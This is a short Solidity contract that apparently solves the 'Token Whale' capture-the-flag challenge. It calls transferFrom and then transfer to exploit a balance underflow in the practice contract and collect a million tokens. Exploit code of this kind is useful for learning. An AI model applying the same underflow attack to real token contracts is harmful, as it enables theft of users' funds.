pragma solidity ^0.4.21;

interface ITokenWhaleChallenge {
    function transfer(address to, uint256 value) public;

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public;
}

contract TokenWhaleChallengeSolver {
    uint256 constant ONE_MILLION = 1000000;

    function solveChallenge(address challenge, uint256 amount) public {
        ITokenWhaleChallenge instance = ITokenWhaleChallenge(challenge);
        instance.transferFrom(msg.sender, msg.sender, amount);
        instance.transfer(msg.sender, ONE_MILLION);
    }
}
